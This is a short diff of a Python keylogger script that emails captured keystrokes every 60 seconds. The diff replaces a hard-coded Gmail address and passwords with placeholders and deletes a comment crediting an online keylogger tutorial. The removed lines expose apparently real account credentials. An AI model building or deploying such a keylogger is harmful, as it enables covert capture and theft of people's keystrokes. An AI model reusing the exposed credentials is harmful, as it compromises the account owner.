@@ -6,9 +6,9 @@ import sys
 
 
 SEND_REPORT_EVERY = 60  # 60 means 60 secs. Sends logs every 60 secs to below user mail
-EMAIL_ADDRESS = "rakeshkr97531@gmail.com"
-EMAIL_PASSWORD = "Rakesh#54321"
-# EMAIL_PASSWORD = "simjxnxzbpokaals"
+EMAIL_ADDRESS = "YOUR_MAIL_ID"
+EMAIL_PASSWORD = "YOUR_MAIL_PASSWORD"
+# EMAIL_PASSWORD = "YOUR_IN_APP_PASSWORD(16digits)"
 
 
 class Keylogger:
@@ -119,7 +119,3 @@ if __name__ == "__main__":
         # if you want keylogger to save file to your local directory
         keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
         keylogger.start()
-
-
-# code used from "https://www.thepythoncode.com/article/write-a-keylogger-python"
-# Understood and then used.
